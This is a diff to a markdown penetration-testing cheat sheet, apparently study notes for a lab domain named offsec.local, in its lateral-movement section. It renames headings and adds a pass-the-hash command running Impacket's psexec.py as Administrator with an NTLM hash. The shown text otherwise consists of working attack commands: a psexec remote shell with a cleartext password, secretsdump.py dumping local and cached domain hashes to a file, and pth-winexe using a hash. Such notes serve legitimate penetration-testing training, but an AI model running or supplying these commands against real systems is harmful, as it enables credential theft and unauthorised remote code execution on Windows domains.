@@ -122,17 +122,18 @@ net accounts
 ```
 
 ### Lateral Movement
-###### Impacket-Psexec
+###### Get shell with clear password
 ```
 impacket-psexec offsec.local/allison@192.168.151.59
 ```
-###### Secretsdump.py
+###### Dump the local password hash and domain cached hash
 ```
 ./secretsdump.py offsec.local/Allison@192.168.176.59 -outputfile /home/kali/Desktop/admin_hash.txt
 ```
 ###### Pass the Hash(only for NTLM, Firewall allows SMB connection, Windows File and Print Sharing feature to be enabled)
 ```
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+/usr/share/doc/python3-impacket/examples/psexec.py OFFSEC.LOCAL/Administrator@192.168.176.57 -hashes "aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5"
 ```
 ###### Converted NTLM hash into a Kerberos TGT and leveraged that to gain remote code execution
 https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
